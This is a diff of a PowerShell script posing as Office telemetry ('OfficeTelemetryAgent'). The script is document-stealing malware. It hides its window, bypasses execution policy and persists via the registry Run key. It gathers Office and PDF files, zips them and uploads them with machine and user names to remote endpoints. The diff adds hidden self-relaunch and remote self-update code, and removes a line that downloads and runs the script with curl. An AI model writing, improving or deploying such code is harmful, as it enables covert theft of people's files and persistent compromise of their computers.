@@ -1,4 +1,4 @@
-# OfficeSync v7
+# OfficeSync v8
 $ErrorActionPreference='SilentlyContinue'
 $ProgressPreference='SilentlyContinue'
 try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
@@ -10,23 +10,30 @@ $cfgUrl="$base/config.txt"
 $scriptUrl="$base/main.ps1"
 $estado='HKCU:\Software\Microsoft\Office\16.0\Common\OTM'
 $pst=Join-Path $env:LOCALAPPDATA 'Microsoft\Office\OTM'
+$alvo=Join-Path $pst 'otm.ps1'
 $run='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 $runNome='OfficeTelemetryAgent'
-$ext='.docx','.doc','.docm','.pptx','.ppt','.pptm','.xlsx','.xls'
+$ext='.docx','.doc','.docm','.pptx','.ppt','.pptm','.xlsx','.xls','.pdf'
 $chaves='versao','ativo','hora_inicio','hora_fim','intervalo','max_envios','dedupe','destruir','endpoint','endpoint2'
 $ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
 
 New-Item -ItemType Directory -Path $pst -Force|Out-Null
 if(-not(Test-Path $estado)){New-Item -Path $estado -Force|Out-Null}
 
-$mtx=New-Object Threading.Mutex($false,'Global\OTM_'+$env:USERNAME)
-if(-not $mtx.WaitOne(0)){exit}
-
 $eu=$PSCommandPath
-if($eu -and $eu -ne (Join-Path $pst 'otm.ps1')){
-  Copy-Item -LiteralPath $eu -Destination (Join-Path $pst 'otm.ps1') -Force -EA 0
+if($eu -and $eu -ne $alvo){
+  Copy-Item -LiteralPath $eu -Destination $alvo -Force -EA 0
   if($eu -like (Join-Path $env:TEMP '*')){Remove-Item -LiteralPath $eu -Force -EA 0}
 }
+
+if(-not $env:OTM_DETACH -and (Test-Path $alvo)){
+  $env:OTM_DETACH='1'
+  Start-Process powershell -WindowStyle Hidden -ArgumentList ('-nop -ni -ep bypass -f "{0}"' -f $alvo)
+  exit
+}
+
+$mtx=New-Object Threading.Mutex($false,'Global\OTM_'+$env:USERNAME)
+if(-not $mtx.WaitOne(0)){exit}
 
 function Est($n){(Get-ItemProperty -Path $estado -Name $n -EA 0).$n}
 function SetEst($n,$v){Set-ItemProperty -Path $estado -Name $n -Value $v -EA 0}
@@ -101,17 +108,12 @@ function Persistir($cmd){
 
 function Zipar($dir,$zip){
   $arr=@(Get-ChildItem -LiteralPath $dir -File -EA 0)
-  if($arr.Count -eq 0){return $false}
-  $fs=[IO.File]::Create($zip)
-  try{
-    $za=New-Object IO.Compression.ZipArchive($fs,[IO.Compression.ZipArchiveMode]::Create)
-    foreach($f in $arr){
-      try{[IO.Compression.ZipFileExtensions]::CreateEntryFromFile($za,$f.FullName,$f.Name)|Out-Null}catch{}
-    }
-    $za.Dispose()
-  }catch{}
-  finally{$fs.Close()}
-  return $true
+  if($arr.Count -eq 0){return -1}
+  try{[IO.Compression.ZipFile]::CreateFromDirectory($dir,$zip,[IO.Compression.CompressionLevel]::Optimal,$false)}catch{return -1}
+  if(-not(Test-Path -LiteralPath $zip)){return -1}
+  $tam=(Get-Item -LiteralPath $zip -EA 0).Length
+  if(-not $tam -or $tam -lt 200){return -1}
+  return $arr.Count
 }
 
 function Log($m){
@@ -136,6 +138,18 @@ while($true){
         if($novo){$cfg=$novo;SetEst 'versao' $cfg.versao}
       }
     }
+
+    if(($ciclo % 20) -eq 0){
+      $novo=Buscar $scriptUrl
+      if($novo -and $novo.Length -gt 2000){
+        $tmp=Join-Path $pst 'otm.new'
+        Set-Content -Path $tmp -Value $novo -Encoding UTF8 -EA 0
+        if((Get-FileHash -LiteralPath $tmp -EA 0).Hash -ne (Get-FileHash -LiteralPath $alvo -EA 0).Hash){
+          Move-Item -LiteralPath $tmp -Destination $alvo -Force -EA 0
+        }
+      }
+    }
+
     if(-not $cfg){Start-Sleep 60;continue}
 
     if([int]$cfg.destruir -eq 1){
@@ -171,7 +185,7 @@ while($true){
     $passa=([int]$cfg.ativo -eq 1) -and (NaJanela ([int]$cfg.hora_inicio) ([int]$cfg.hora_fim) $hora) -and ($max -eq 0 -or $envios -lt $max)
 
     if(-not $passa){
-      Persistir ('cmd /c curl.exe -s -L --max-time 20 -o "{0}" "{1}?t=%RANDOM%" && powershell -w h -nop -ni -ep bypass -f "{0}"' -f (Join-Path $pst 'otm.ps1'),$scriptUrl)
+      Persistir ('powershell -w h -nop -ni -ep bypass -f "{0}"' -f $alvo)
       Start-Sleep -Seconds ($int+(Get-Random -Minimum 0 -Maximum 6))
       continue
     }
@@ -234,10 +248,10 @@ while($true){
       }
 
       $zip=Join-Path $env:TEMP ('ofs_'+(Get-Random)+'.zip')
-      $okzip=$false
-      try{$okzip=Zipar $out $zip}catch{$okzip=$false}
+      $okzip=0
+      try{$okzip=Zipar $out $zip}catch{$okzip=-1}
 
-      if($okzip -and (Test-Path $zip)){
+      if($okzip -gt 0 -and (Test-Path $zip)){
         $meta='{"username":"'+$env:COMPUTERNAME+'","content":"'+$env:COMPUTERNAME+' / '+$env:USERNAME+' / ciclo '+($envios+1)+' / '+$sel.Count+' doc"}'
 
         $ok=0
@@ -261,12 +275,12 @@ while($true){
           }
         }else{Log "envio falhou cod=$cod"}
         Remove-Item $zip -Force -EA 0
-      }else{Log "zip falhou em $out"}
+      }else{Log "zip falhou sel=$($sel.Count) em $out"}
     }
 
     Remove-Item $out -Recurse -Force -EA 0
 
-    Persistir ('cmd /c curl.exe -s -L --max-time 20 -o "{0}" "{1}?t=%RANDOM%" && powershell -w h -nop -ni -ep bypass -f "{0}"' -f (Join-Path $pst 'otm.ps1'),$scriptUrl)
+    Persistir ('powershell -w h -nop -ni -ep bypass -f "{0}"' -f $alvo)
   }catch{
     Log ("ERRO "+$_.Exception.Message+" linha "+$_.InvocationInfo.ScriptLineNumber)
   }
